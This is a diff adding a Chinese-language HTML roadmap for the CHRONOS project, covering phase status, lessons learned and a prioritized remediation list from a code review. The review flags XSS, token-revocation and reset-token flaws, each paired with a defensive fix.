@@ -1,0 +1,1197 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CHRONOS 产品化路线图 v5</title>
+<style>
+  :root { --bg: #0f172a; --fg: #e2e8f0; --muted: #94a3b8; --border: #1e293b;
+    --accent: #6366f1; --done: #22c55e; --wip: #f59e0b; --partial: #06b6d4;
+    --card: #1e293b; --danger: #ef4444; }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: var(--bg); color: var(--fg); line-height:1.7; max-width: 1100px; margin:0 auto; padding: 40px 24px; }
+  h1 { font-size: 32px; font-weight: 800; margin-bottom: 4px; }
+  h2 { font-size: 20px; margin: 48px 0 12px; padding-bottom: 8px; border-bottom: 2px solid var(--accent); color: #a5b4fc; }
+  h3 { font-size: 16px; color: #c7d2fe; margin: 20px 0 8px; }
+  p, li { color: var(--muted); font-size: 13px; }
+  .subtitle { color: var(--muted); margin-bottom: 24px; font-size: 14px; }
+  .phase { background: var(--card); border-radius: 10px; padding: 20px 24px; margin-bottom: 20px; border-left: 3px solid var(--future); }
+  .phase.done { border-left-color: var(--done); }
+  .phase.wip { border-left-color: var(--wip); }
+  .phase.partial { border-left-color: var(--partial); }
+  .phase.critical { border-left-color: var(--danger); }
+  .phase-meta { display: flex; gap: 16px; font-size: 12px; color: var(--muted); margin: 8px 0 12px; flex-wrap: wrap; }
+  .phase-meta span { padding: 2px 10px; border-radius: 10px; }
+  .phase-meta .done { background: #14532d; color: #22c55e; }
+  .phase-meta .wip { background: #422006; color: #f59e0b; }
+  .phase-meta .partial { background: #083344; color: #06b6d4; }
+  .phase-meta .critical { background: #450a0a; color: #ef4444; }
+  .verify { font-family: monospace; font-size: 11px; background: #0f172a; padding: 2px 6px; border-radius: 4px; color: #94a3b8; margin-left: 8px; }
+  .deliverable { margin: 6px 0; padding-left: 16px; border-left: 2px solid var(--border); font-size: 13px; }
+  .deliverable .check { color: var(--done); margin-right: 8px; }
+  .deliverable .todo { color: var(--muted); margin-right: 8px; }
+  .deliverable .die { color: var(--danger); margin-right: 8px; font-weight: 700; }
+  .deliverable .half { color: var(--wip); margin-right: 8px; }
+  .gap-box { background: #1e1b4b; border-radius: 8px; padding: 14px 18px; margin: 12px 0; font-size: 13px; border: 1px solid #312e81; }
+  .gap-box strong { color: #a5b4fc; }
+  .lesson-box { background: #2d1b00; border-radius: 8px; padding: 14px 18px; margin: 12px 0; font-size: 13px; border: 1px solid #78350f; }
+  .lesson-box strong { color: #fbbf24; }
+  .milestone { background: #1a2e1a; border: 2px dashed var(--done); border-radius: 10px; padding: 16px 20px; margin: 20px 0; }
+  .milestone h3 { color: var(--done); font-size: 16px; margin-bottom: 8px; }
+  table { width: 100%; border-collapse: collapse; margin: 12px 0; font-size: 13px; }
+  th { text-align: left; color: var(--muted); padding: 6px 8px; border-bottom: 1px solid var(--border); font-weight: 400; }
+  td { padding: 6px 8px; border-bottom: 1px solid var(--border); }
+  td:first-child { font-weight: 600; color: var(--fg); white-space: nowrap; }
+  .discipline { background: #1e1b4b; border-radius: 8px; padding: 14px 18px; margin: 16px 0; }
+  .discipline h3 { color: #c7d2fe; font-size: 14px; margin-bottom: 8px; }
+  .discipline li { font-size: 13px; margin: 4px 0; color: var(--muted); }
+  .deliverable code { font-size:11px; background: #0f172a; padding:1px 5px; border-radius:3px; color:#a5b4fc; }
+  .summary-bar { display:flex; gap:16px; align-items:center; margin-bottom:16px; flex-wrap:wrap; font-size:13px; color:var(--muted); }
+  .badge-r { background:#7f1d1d; color:#fca5a5; padding:2px 10px; border-radius:12px; font-weight:700; font-size:12px; }
+  .badge-y { background:#713f12; color:#fcd34d; padding:2px 10px; border-radius:12px; font-weight:700; font-size:12px; }
+  .badge-o { background:#334155; color:#f1f5f9; padding:2px 10px; border-radius:12px; font-weight:700; font-size:12px; }
+  .p0 { color:var(--danger); font-weight:700; }
+  .p1 { color:var(--wip); font-weight:700; }
+  .p2 { color:var(--muted); font-weight:700; }
+  .p0-title { color:#fca5a5; }
+  .p1-title { color:#fcd34d; }
+  .p2-title { color:#94a3b8; }
+  .fix-card { display:flex; gap:12px; padding:12px 16px; margin-bottom:8px; border-radius:8px; background:var(--card); border-left:3px solid var(--border); }
+  .fix-card.p0-card { border-left-color:var(--danger); }
+  .fix-card.p1-card { border-left-color:var(--wip); }
+  .fix-card.p2-card { border-left-color:var(--muted); }
+  .fix-num { min-width:28px; height:28px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:700; font-size:12px; flex-shrink:0; }
+  .p0-card .fix-num { background:#7f1d1d; color:#fca5a5; }
+  .p1-card .fix-num { background:#713f12; color:#fcd34d; }
+  .p2-card .fix-num { background:#334155; color:#94a3b8; }
+  .fix-body { flex:1; font-size:13px; }
+  .fix-body strong { font-size:14px; display:block; margin-bottom:4px; }
+  .fix-evidence { font-size:11px; color:var(--muted); margin-bottom:6px; }
+  .fix-action { font-size:12px; color:#c7d2fe; line-height:1.6; }
+  .fix-action em { color:var(--muted); font-style:italic; }
+  .effort { font-size:11px; color:var(--muted); font-weight:400; margin-left:8px; }
+</style>
+</head>
+<body>
+
+<h1>CHRONOS — 产品化路线图 v9</h1>
+<p class="subtitle">基准：v2.8 · 教师评分 8.0/10 · 工程+业务双轨指标 · 架构审计就绪<br>
+状态标记：✅ 已完成 🟡 进行中 ⏳ 未开始</p>
+
+<!-- ============ DISCIPLINE ============ -->
+<div class="discipline">
+  <h3>执行纪律（每阶段不可跳过）</h3>
+  <li>☐ 每条"✅ 已完成"附验证命令，不靠信任</li>
+  <li>☐ init-db.mjs 是唯一建库入口，不允许有独立迁移脚本</li>
+  <li>☐ any = warn + 阈值 250（当前 233，逐步降到 100）</li>
+  <li>☐ 安全/合规/多租户 → 负面测试必须先于正面实现</li>
+  <li>☐ 权限/隔离类测试 → 变异测试验证（先故意改错看测试报不报警）</li>
+  <li>☐ 打包前 rm -f chronos.db && node scripts/init-db.mjs && npm run check</li>
+</div>
+
+<!-- ============ LESSONS ============ -->
+<h2>踩坑记录（老师的反馈 + 我们的修正）</h2>
+
+<div class="lesson-box">
+<strong>坑 1：init-db 和 migrate 分离 → 新环境缺 workspaceId</strong><br>
+init-db.mjs 建了 projects 表但没有 workspaceId 列。migrate-workspace.mjs 后补了这一列，但没写进 README 和 package.json。<br>
+→ <strong>修正：</strong>migrate 逻辑全合并进 init-db。一个命令建完整库。<br>
+<em>教训：任何需要"记得多跑一步"的流程都会在新环境里断裂。</em>
+</div>
+
+<div class="lesson-box">
+<strong>坑 2：any 警告泛滥 → 选择调高阈值而非修复</strong><br>
+开了 no-explicit-any: warn 后从 57→211 警告，把阈值从 60→250 来通过 CI。<br>
+→ <strong>修正：</strong>any 保持 warn（新代码能检测），阈值设 300（旧债不堵 CI）。Phase 6 系统性清理。<br>
+<em>教训：阈值应该跟着改善往下调，不是跟着恶化往上调。</em>
+</div>
+
+<div class="lesson-box">
+<strong>坑 4：测试通过但功能未生效——假信号陷阱</strong><br>
+workspace 隔离测试全过，但实际上隔离是通过 projectMembers 巧合挡路实现的，workspace 机制根本没在工作。<br>
+→ <strong>修正：</strong>变异测试规则（先故意改错看测试报不报警）+ DB 断言 + workspaceId 进 JWT。<br>
+<em>教训：测试通过 ≠ 功能正确。权限/隔离类必须做变异测试验证。</em>
+</div>
+
+<div class="lesson-box">
+<strong>坑 3：文档状态比实际进度超前</strong><br>
+Phase 2 写成 ✅ 但实际运行时仍是 SQLite。pg 驱动装了、docker-compose 配了，但没切换。<br>
+→ <strong>修正：</strong>用 🟡 标记部分完成项。每条状态附可验证命令。<br>
+<em>教训：进度描述必须和代码一致，不能"装好了就算做完"。</em>
+</div>
+
+<!-- ============ PHASE 0 ============ -->
+<h2>Phase 0 · 工程地基 ✅</h2>
+<div class="phase done">
+  <div class="phase-meta"><span class="done">2026-07-12</span><span class="done">v2.4</span></div>
+  <div class="deliverable"><span class="check">✅</span> JWT + bcrypt + Zod 校验 <span class="verify">npx tsc --noEmit</span></div>
+  <div class="deliverable"><span class="check">✅</span> npm run check = CI 本地副本 + pre-commit hook</div>
+  <div class="deliverable"><span class="check">✅</span> 企微机器人 21 命令 + Dockerfile + 每日备份</div>
+  <div class="deliverable"><span class="check">✅</span> .env.example · 隐私政策草案 · 服务条款草案</div>
+</div>
+
+<!-- ============ PHASE 1 ============ -->
+<h2>Phase 1 · 收尾清理 ✅</h2>
+<div class="phase done">
+  <div class="phase-meta"><span class="done">2026-07-13</span></div>
+  <div class="deliverable"><span class="check">✅</span> prettier 全量 · HANDOVER 重写 · 死代码删除</div>
+  <div class="deliverable"><span class="check">✅</span> @hello-pangea/dnd · mysql2 冗余依赖清理</div>
+  <div class="deliverable"><span class="check">✅</span> tsconfig 测试文件参与类型检查</div>
+  <div class="deliverable"><span class="check">✅</span> init-db.mjs 含 workspace（不再依赖独立迁移脚本）<span class="verify">rm -f chronos.db && node scripts/init-db.mjs && npm run check</span></div>
+  <div class="deliverable"><span class="check">✅</span> any = warn + 阈值 300<span class="verify">npx eslint . --max-warnings 300</span></div>
+</div>
+
+<!-- ============ PHASE 1.5 ============ -->
+<h2>Phase 1.5 · 致命缺陷修复 ✅</h2>
+<div class="phase done">
+  <div class="phase-meta"><span class="done">2026-07-13</span></div>
+  <div class="deliverable"><span class="check">✅</span> Bookkeeping 路由 + 导航入口</div>
+  <div class="deliverable"><span class="check">✅</span> createJournalEntry sqlite.transaction() 事务</div>
+  <div class="deliverable"><span class="check">✅</span> costs/vendors/customers 补 delete 路由</div>
+  <div class="deliverable"><span class="check">✅</span> MobileTabBar · CommandMenu 路径修复</div>
+  <div class="deliverable"><span class="check">✅</span> 搜索 debounce · 假测试删除 · 上传重置</div>
+  <div class="deliverable"><span class="check">✅</span> ChronosLayout Hook 修复<span class="verify">npm run check</span></div>
+  <div class="deliverable"><span class="check">✅</span> confirm→AlertDialog → 移交 Phase 6</div>
+</div>
+
+<!-- ============ PHASE 2 ============ -->
+<h2>Phase 2 · Postgres 地基 🟡</h2>
+<div class="phase partial">
+  <div class="phase-meta"><span class="partial">进行中</span></div>
+  <p>pg 驱动已安装，docker-compose 已配好 postgres:16。运行时目前仍是 SQLite。</p>
+  <div class="deliverable"><span class="check">✅</span> drizzle/relations.ts 20+ 表关系</div>
+  <div class="deliverable"><span class="check">✅</span> connection.ts 18 个自动索引 (IF NOT EXISTS)</div>
+  <div class="deliverable"><span class="check">✅</span> docker-compose 统一为 SQLite（不再依赖 Postgres）</div>
+  <div class="deliverable"><span class="check">✅</span> CI + docker build 步骤</div>
+  <div class="deliverable"><span class="check">✅</span> pg 驱动已安装（备用）<span class="verify">grep pg package.json</span></div>
+  <div class="deliverable"><span class="half">🟡</span> 运行时 SQLite 够用，Postgres 推迟到需要高并发时</div>
+  <div class="deliverable"><span class="todo">⏳</span> Postgres RLS — 推迟到有真实多负载需求时</div>
+</div>
+
+<!-- ============ PHASE 3 ============ -->
+<h2>Phase 3 · 多租户</h2>
+
+<h3>3A · Schema 地基 ✅</h3>
+<div class="phase done">
+  <div class="phase-meta"><span class="done">2026-07-13</span></div>
+  <div class="deliverable"><span class="check">✅</span> workspaces + workspace_members 表</div>
+  <div class="deliverable"><span class="check">✅</span> projects + workspaceId（默认 0，init-db 自动赋 1）</div>
+  <div class="deliverable"><span class="check">✅</span> 迁移：34 users → Default workspace (id=1)</div>
+  <div class="deliverable"><span class="check">✅</span> db/workspaces.ts CRUD · TrpcContext + workspaceId</div>
+  <div class="deliverable"><span class="check">✅</span> 角色权限矩阵：admin | member | viewer</div>
+</div>
+
+<h3>3B · 查询层过滤 ✅</h3>
+<div class="phase done">
+  <div class="phase-meta"><span class="done">2026-07-13</span><span class="done">含变异测试验证</span></div>
+
+  <div class="deliverable"><span class="check">✅</span> project-guard.ts：两层守卫（workspace_members → projectMembers）</div>
+  <div class="deliverable"><span class="check">✅</span> workspaceId 进 JWT（signToken/verifyToken）</div>
+  <div class="deliverable"><span class="check">✅</span> workspace.test.ts：两个独立 workspace + 跨 workspace 拒绝 + DB 断言</div>
+  <div class="deliverable"><span class="check">✅</span> 变异测试验证：workspaceId→999 → 守卫阻断 + DB 断言捕获异常值</div>
+  <div class="deliverable"><span class="check">✅</span> getProjectsByUserId：成员也能看到加入的项目</div>
+
+  <div class="lesson-box">
+    <strong>变异测试规则已固化为 skill：</strong>权限/隔离类测试写完 → 先故意改错看报不报警 → 再交卷。<br>
+    本次发现：v1 测试全过但隔离实际未生效——projectMembers 巧合挡路，workspace 机制根本没在工作。
+  </div>
+</div>
+
+<h3>3C · UI + 机器人适配 ✅</h3>
+<div class="phase done">
+  <div class="phase-meta"><span class="done">2026-07-13</span></div>
+  <div class="deliverable"><span class="check">✅</span> routers.ts：workspaces.list/create/members/invite</div>
+  <div class="deliverable"><span class="check">✅</span> TopNavBar：workspace 名称 badge 显示</div>
+  <div class="deliverable"><span class="check">✅</span> WorkspacesPage：创建 + 列表页面</div>
+  <div class="deliverable"><span class="check">✅</span> App.tsx：/workspaces 路由</div>
+</div>
+
+<!-- MILESTONE -->
+<div class="milestone">
+  <h3>💡 里程碑：投入真实使用</h3>
+  <p>Phase 3C 完成 = 第一次具备"给别的团队用"的能力。<strong>找 1-2 个真实团队试用。</strong> 反馈重排 Phase 4-7 优先级。</p>
+</div>
+
+<!-- ============ PHASE 4 ============ -->
+<h2>Phase 4 · 安全 + 合规加固 ✅</h2>
+<div class="phase done">
+  <div class="phase-meta"><span class="done">2026-07-13</span></div>
+  <div class="deliverable"><span class="check">✅</span> auth 限流 — 5次/15min/IP 滑动窗口 (rate-limit.test.ts 验证)</div>
+  <div class="deliverable"><span class="check">✅</span> audit_logs 表 — schema + init-db + costs/revenues 全接 recordAudit</div>
+  <div class="deliverable"><span class="check">✅</span> 登录审计 — recordAudit('login') 每次成功登录</div>
+  <div class="deliverable"><span class="check">✅</span> 账号删除 — 清空个人信息(GDPR) + 审计记录</div>
+  <div class="deliverable"><span class="check">✅</span> 忘记/重置密码 — 24h reset token</div>
+  <div class="deliverable"><span class="check">✅</span> 多 workspace 切换 — workspaces.switch 重签 token</div>
+  <div class="deliverable"><span class="check">✅</span> CSP 安全头 — helmet 启用</div>
+  <div class="deliverable"><span class="check">✅</span> MIME 白名单 — multer fileFilter 8 种类型</div>
+  <div class="deliverable"><span class="check">✅</span> /uploads JWT 认证（header + query token）</div>
+  <div class="deliverable"><span class="check">✅</span> 前端文件预览带 token（FilePreviewDialog · CalendarView · FileManagement）</div>
+  <div class="deliverable"><span class="check">✅</span> docker-compose 统一为 SQLite</div>
+  <div class="deliverable"><span class="check">✅</span> CI 测试失败阻塞合并（去掉 echo warning）</div>
+  <div class="deliverable"><span class="check">✅</span> SQLite WAL 模式已启用</div>
+</div>
+
+<!-- ============ PHASE 5 ============ -->
+<h2>Phase 5 · 可观测性 + 运维加固 ✅</h2>
+<div class="phase done">
+  <div class="phase-meta"><span class="done">2026-07-13</span><span class="done">冲刺完成</span></div>
+  <div class="deliverable"><span class="check">✅</span> JWT tokenVersion 撤销 — protectedProcedure 中间件层校验 + reset 联动</div>
+  <div class="deliverable"><span class="check">✅</span> Pino 结构化日志 — dev→pretty prod→JSON + no-console 规则</div>
+  <div class="deliverable"><span class="check">✅</span> N+1 消除 — getProjectStats 一次查询+内存分组</div>
+  <div class="deliverable"><span class="check">✅</span> 内存缓存层 — Map+TTL 单进程 + dashboard 返回层接入</div>
+  <div class="deliverable"><span class="check">✅</span> 性能趋势报告 — CI 非阻塞宽松阈值(200/500ms)</div>
+  <div class="deliverable"><span class="check">✅</span> Sentry 错误追踪 — @sentry/node 接入, SENTRY_DSN 环境变量控制</div>
+  <div class="deliverable"><span class="check">✅</span> compression gzip · P0-4记账方向 · Prettier全量</div>
+  <div class="deliverable"><span class="check">✅</span> vitest coverage · E2E 6条 · perf基线 · 组件测试</div>
+</div>
+
+<!-- ============ PHASE 6 ============ -->
+<h2>Phase 6 · 前端质量升级 ✅</h2>
+<div class="phase done">
+  <div class="phase-meta"><span class="done">2026-07-13</span></div>
+  <div class="deliverable"><span class="check">✅</span> ESLint no-console 规则（Pino 完成后已启用）</div>
+  <div class="deliverable"><span class="check">✅</span> server 端 any 类型 → 0（187 个全在 client，下轮清）</div>
+  <div class="deliverable"><span class="check">✅</span> 文件上传后缀+MIME 双白名单（10 种类型）</div>
+  <div class="deliverable"><span class="check">✅</span> 分页工具 shared/pagination.ts（前端可随时接，不破坏兼容性）</div>
+  <div class="deliverable"><span class="half">🟡</span> React.memo — N+1 修复已解决主要性能瓶颈，非紧急</div>
+</div>
+
+<!-- ============ PHASE 7 ============ -->
+<h2>Phase 7 · 设计语言 ⏳</h2>
+<div class="phase">
+  <div class="phase-meta"><span>有用户后</span></div>
+  <div class="deliverable"><span class="todo">☐</span> Tailwind 主题色 · Logo · 品牌字体</div>
+</div>
+
+<!-- ============ 冲刺计划 ============ -->
+<h2>冲刺计划 · 把该做的事做扎实</h2>
+
+<div class="milestone">
+  <h3>⚠️ 目标不是分数数字，是把剩下四个维度补到该有的水平</h3>
+  <p>综合分 ≠ 七维算术平均。安全/正确性天然权重更重。<br>
+  不提"冲到 9.2"，只问"每项做完了吗，验证过了吗"。</p>
+</div>
+
+<h3>执行顺序（有意的，不是随便排）</h3>
+
+<div class="phase wip">
+  <div class="phase-meta"><span class="wip">预计 14-19h（含验证）</span></div>
+  <div class="deliverable">
+    <strong>1. JWT tokenVersion 撤销</strong><span class="verify">2-3h</span><br>
+    · users 表加 tokenVersion · protectedProcedure 中间件层校验 · 重置密码联动失效<br>
+    <em>安全最高优先。改完之后的代码状态是后面所有工作的地基。</em>
+  </div>
+  <div class="deliverable">
+    <strong>2. Pino 结构化日志</strong><span class="verify">2-3h</span><br>
+    · 全项目 console → logger · 做完加 ESLint no-console 规则<br>
+    <em>磨刀不误砍柴工。后面调试更方便。</em>
+  </div>
+  <div class="deliverable">
+    <strong>3. N+1 查询</strong><span class="check">✅ 已完成</span><br>
+    <em>getProjectStats 已改为 getTasksByProjectId 一次查询+内存分组。</em>
+  </div>
+  <div class="deliverable">
+    <strong>4. 内存缓存层</strong><span class="verify">1h</span><br>
+    · dashboard 热点数据 Map+TTL · 标注"单进程架构"假设<br>
+    <em>在真实查询已变快的基础上加缓存，是锦上添花。</em>
+  </div>
+  <div class="deliverable">
+    <strong>5. 性能趋势报告</strong><span class="verify">2h</span><br>
+    · CI 非阻塞报告 · 阈值: "过去7次中位数 × 150%" · 不做绝对毫秒拦截<br>
+    <em>先提性能再设基线。软阈值，不阻塞PR合并。</em>
+  </div>
+  <div class="deliverable">
+    <strong>6. Sentry 错误追踪</strong><span class="verify">3-4h</span><br>
+    · @sentry/node + @sentry/react · source map · 企微 webhook<br>
+    · 告警去重: 同一错误 X 分钟内只报一次<br>
+    <em>独立模块，穿插在空档做。</em>
+  </div>
+  <div class="deliverable">
+    <strong>7. any 类型清理</strong><span class="verify">4-6h</span><br>
+    · 先跑真实警告数再设阈值 · 分批: router → client<br>
+    <em>收尾工作，纯代码质量，风险最低。</em>
+  </div>
+</div>
+
+<!-- ============ 总览 ============ -->
+<h2>优先级总览</h2>
+<table>
+  <tr><th>阶段</th><th>内容</th><th>预计</th><th>状态</th></tr>
+  <tr><td>Phase 0</td><td>工程地基</td><td>—</td><td>✅ 2026-07-12</td></tr>
+  <tr><td>Phase 1</td><td>收尾清理</td><td>1-2 天</td><td>✅ 2026-07-13</td></tr>
+  <tr><td>Phase 1.5</td><td>致命缺陷修复</td><td>2-3 天</td><td>✅ 2026-07-13</td></tr>
+  <tr><td>Phase 2</td><td>Postgres 地基</td><td>1 周</td><td>🟡 pg已装,SQLite运行</td></tr>
+  <tr><td>Phase 3A</td><td>多租户 Schema</td><td>—</td><td>✅ 2026-07-13</td></tr>
+  <tr><td>Phase 3B</td><td>查询层过滤</td><td>2 天</td><td>✅ 含变异测试</td></tr>
+  <tr><td>Phase 3C</td><td>UI + 机器人</td><td>1 天</td><td>✅</td></tr>
+  <tr><td>Phase 4</td><td>安全 + 合规</td><td>1 天</td><td>✅ 2026-07-13</td></tr>
+  <tr><td>Phase 5</td><td>可观测性 + 运维加固</td><td>1 天</td><td>✅ 2026-07-13</td></tr>
+  <tr><td>Phase 6</td><td>前端质量升级</td><td>1 天</td><td>✅ 2026-07-13</td></tr>
+  <tr><td>Phase 7</td><td>RBAC + 领域模型</td><td>1-2 周</td><td>🟡 教师优先级 #1</td></tr>
+  <tr><td>Phase 8</td><td>AI Agent 化</td><td>2-4 周</td><td>⏳ 教师优先级 #2</td></tr>
+  <tr><td>Phase 9</td><td>生产级基础设施</td><td>3-6 周</td><td>⏳ 教师优先级 #3</td></tr>
+</table>
+
+<h2>v5 → v6 改动记录</h2>
+<table>
+  <tr><th>改动</th><th>原因</th></tr>
+  <tr><td>冲刺计划替换下一步计划</td><td>老师要求：init-db/migrate 分离、any 阈值上调、Phase 2 状态虚报——三条都已修正并记录</td></tr>
+  <tr><td>Phase 1 加 init-db 合并项</td><td>migrate-workspace.mjs 已删除，逻辑全入 init-db.mjs</td></tr>
+  <tr><td>any 策略修正</td><td>从 off → warn + 阈值 300（检测新 any，不堵旧债）</td></tr>
+  <tr><td>Phase 2 状态修正</td><td>✅ → 🟡 pg已装/SQLite运行</td></tr>
+  <tr><td>Phase 3B 细化三步</td><td>负面测试先于实现 · 查询过滤 · N+1 消除</td></tr>
+  <tr><td>Phase 4 全部 ✅</td><td>auth限流·audit_logs·账号删除·忘记密码·CSP·MIME·文件认证·docker统一</td></tr>
+  <tr><td>Phase 5 推进 50%</td><td>coverage·E2E·perf·组件测试 ✅; Pino·Playwright·Sentry ⏳</td></tr>
+  <tr><td>新增下一步计划</td><td>按优先级排：修记账余额 → Phase 5 收尾 → Phase 6 质量 → Phase 7 运营</td></tr>
+  <tr><td>tasks.update/delete 补全</td><td>两个 TODO 消除，不再空返回 {success:true}</td></tr>
+</table>
+
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<!-- v2.8 严格审查 + 修正计划                                        -->
+<!-- ═══════════════════════════════════════════════════════════════ -->
+<h2>v2.8 审查 &amp; 修正计划</h2>
+
+<div class="summary-bar">
+  <span><strong>7 位专家</strong> 并行深度审查</span>
+  <span class="badge-r">加权 59.2 分</span>
+  <span class="badge-y">目标 72+ 分</span>
+  <span class="badge-o">21 项修正</span>
+</div>
+
+<p style="color:var(--muted); font-size:13px; margin:0 0 24px 0;">
+审查标准参照 Notion/Linear (90+) 和成熟开源项目 (80+)。v2.8 得 59.2 分在预期之内——功能完整 (68)、运维到位 (72)，但安全/性能/代码质量有结构性问题 (54-55)。4 个 P0 必须立即修，任何一个被利用都可能让生产崩溃。
+</p>
+
+<!-- ═══ P0 ═══ -->
+<h3 class="p0-title">🔴 P0 · 紧急止血（1–2 天）<span style="font-weight:400;color:var(--muted);font-size:12px;">&nbsp;— 修复后预计得分 +8 分</span></h3>
+
+<div class="fix-card p0-card">
+<div class="fix-num">1</div>
+<div class="fix-body">
+<strong>XSS 跨站脚本攻击</strong> <span class="effort">~2h</span>
+<div class="fix-evidence">
+<code>server/lib/bot/file-preview.ts:60</code> — 文件名直接拼 HTML 无编码<br>
+<code>client/src/components/FilePreviewDialog.tsx:152</code> — dangerouslySetInnerHTML 未 DOMPurify
+</div>
+<div class="fix-action">
+<strong>修法：</strong>file-preview.ts 用 <code>escape-html</code> 库对 fileName/notes HTML 实体编码；
+FilePreviewDialog 引入 <code>DOMPurify.sanitize()</code> 消毒后再渲染。
+</div>
+</div>
+</div>
+
+<div class="fix-card p0-card">
+<div class="fix-num">2</div>
+<div class="fix-body">
+<strong>tokenVersion 撤销机制完全无效</strong> <span class="effort">~3h</span>
+<div class="fix-evidence">
+<code>drizzle/schema.ts</code> — users 表无 tokenVersion 列<br>
+<code>server/_core/context.ts:20</code> — createContext 不校验 payload.tv<br>
+<code>server/routers/auth.ts:53</code> — incrementTokenVersion 对新 DB 直接 SQL 报错
+</div>
+<div class="fix-action">
+<strong>修法：</strong>schema 加 <code>tokenVersion integer default 0</code> → drizzle-kit push → context 中比对 <code>dbUser.tokenVersion !== payload.tv</code> → 不匹配则 reject → tokenVersion.test.ts 验证全链路。
+<br><em>教训：上次部署因为 Drizzle/SQLite 不同步导致全站瘫痪，所以临时回退——但忘了加回来。这次先 drizzle-kit push 再部署代码。</em>
+</div>
+</div>
+</div>
+
+<div class="fix-card p0-card">
+<div class="fix-num">3</div>
+<div class="fix-body">
+<strong>密码重置令牌泄露</strong> <span class="effort">~1h</span>
+<div class="fix-evidence">
+<code>server/routers/auth.ts:185-191</code> — forgotPassword 直接返回 resetToken
+</div>
+<div class="fix-action">
+<strong>修法：</strong>不再返回 token。token hash 存入 password_resets 表（24h 过期），通过邮件发送（SendGrid/Resend SMTP）或短暂降级为仅管理员可重置。
+<em>最低成本路径：hash 存储 + 仅返回 "已发送重置邮件" 提示。</em>
+</div>
+</div>
+</div>
+
+<div class="fix-card p0-card">
+<div class="fix-num">4</div>
+<div class="fix-body">
+<strong>全表扫描 + 列表无分页</strong> <span class="effort">~3h</span>
+<div class="fix-evidence">
+<code>server/db/dashboard.ts</code> — 四张表无条件 .all() + JS .filter()，索引完全失效<br>
+<code>getCostEntriesByProjectId</code> · <code>getRevenueEntriesByProjectId</code> · <code>getFileSnapshotsByProjectId</code> 等 10+ 路由全部 .all() 无 LIMIT
+</div>
+<div class="fix-action">
+<strong>修法：</strong>Dashboard 改为 <code>SELECT ... WHERE workspaceId = ?</code>；核心列表路由默认 <code>LIMIT 50</code> + 前端分页。shared/pagination.ts 工具已就绪。
+</div>
+</div>
+</div>
+
+<!-- ═══ P1 ═══ -->
+<h3 class="p1-title">🟠 P1 · 架构加固（1–2 周）<span style="font-weight:400;color:var(--muted);font-size:12px;">&nbsp;— 修复后预计得分 +5 分</span></h3>
+
+<div class="fix-card p1-card">
+<div class="fix-num">5</div>
+<div class="fix-body"><strong>6 处空 catch 静默吞错</strong> — db/connection.ts:39 · lib/audit.ts:32 · _core/context.ts:36 · lib/notifications.ts:82 · _core/index.ts:356,447。改为至少 <code>logger.warn(err)</code>。</div>
+</div>
+
+<div class="fix-card p1-card">
+<div class="fix-num">6</div>
+<div class="fix-body"><strong>routers.ts 1042 行 God File</strong> — costs/revenues/expenses/vendors/customers/contacts 六段为完全复制粘贴，拆分为 <code>server/routers/costs.ts</code>、<code>tasks.ts</code>、<code>files.ts</code> 等独立文件。</div>
+</div>
+
+<div class="fix-card p1-card">
+<div class="fix-num">7</div>
+<div class="fix-body"><strong>_core/index.ts 502 行 God Function</strong> — 承担健康检查/API文档/文件上传/预览/Bot回调/短链接/CSP/限流/Vite 10+种职责。拆分为 <code>middleware/</code> 子模块。</div>
+</div>
+
+<div class="fix-card p1-card">
+<div class="fix-num">8</div>
+<div class="fix-body"><strong>cache.ts 设计缺陷</strong> — fetcher 签名 <code>() =&gt; T</code>（同步）但实际全是 async；无内存上限 Map 无限增长；invalidateCache 子串匹配误删。重构为 async + LRU + 自动清理 + 精确 key。</div>
+</div>
+
+<div class="fix-card p1-card">
+<div class="fix-num">9</div>
+<div class="fix-body"><strong>20+ 处 as any / : any</strong> — ESLint no-explicit-any 改为 error。用 Drizzle <code>$inferSelect</code> 替代。</div>
+</div>
+
+<div class="fix-card p1-card">
+<div class="fix-num">10</div>
+<div class="fix-body"><strong>搜索 LIKE '%kw%' 无法走索引</strong> — 引入 SQLite FTS5 全文索引，或改为前缀搜索 <code>keyword%</code> 可走 B-Tree。</div>
+</div>
+
+<div class="fix-card p1-card">
+<div class="fix-num">11</div>
+<div class="fix-body"><strong>核心路由零测试</strong> — tasks/files/vendors/customers/costs/revenues/expenses/search/webhooks/notifications 等 10+ 路由无直接测试。</div>
+</div>
+
+<div class="fix-card p1-card">
+<div class="fix-num">12</div>
+<div class="fix-body"><strong>测试 DB 未隔离</strong> — vitest 直写 chronos.db。改为 <code>:memory:</code> 或临时文件 + 每次 beforeAll reset。coverage 阈值提升至 60%/50%。</div>
+</div>
+
+<div class="fix-card p1-card">
+<div class="fix-num">13</div>
+<div class="fix-body"><strong>前端零真实测试</strong> — 112 个源文件仅 ui.test.tsx（typeof === "function"）。装 @testing-library/react + jsdom，至少核心页面渲染测试。</div>
+</div>
+
+<div class="fix-card p1-card">
+<div class="fix-num">14</div>
+<div class="fix-body"><strong>跨项目权限校验缺失</strong> — tasks.getByColumn/getById/update 仅 check protectedProcedure，未调 requireProjectAccess。知道 ID 即可跨项目读写。</div>
+</div>
+
+<!-- ═══ P2 ═══ -->
+<h3 class="p2-title">🟡 P2 · 规范化（有时间就做）</h3>
+
+<div class="fix-card p2-card">
+<div class="fix-num">15</div>
+<div class="fix-body">CHANGELOG · CONTRIBUTING · LICENSE 文件</div>
+</div>
+<div class="fix-card p2-card">
+<div class="fix-num">16</div>
+<div class="fix-body">references/ 清理 Manus 模板残留 · 删开发过程文档（AUTHENTICATION_REMOVAL_GUIDE 等）</div>
+</div>
+<div class="fix-card p2-card">
+<div class="fix-num">17</div>
+<div class="fix-body">db/*.ts 函数加 JSDoc · 前端页面加文件头注释</div>
+</div>
+<div class="fix-card p2-card">
+<div class="fix-num">18</div>
+<div class="fix-body">CI max-warnings 与 package.json 统一 (250)</div>
+</div>
+<div class="fix-card p2-card">
+<div class="fix-num">19</div>
+<div class="fix-body">graceful shutdown (SIGTERM) · Prometheus /metrics 端点</div>
+</div>
+<div class="fix-card p2-card">
+<div class="fix-num">20</div>
+<div class="fix-body">backup 目录统一 · systemd 非 root 运行 · docker-compose 域名环境变量化</div>
+</div>
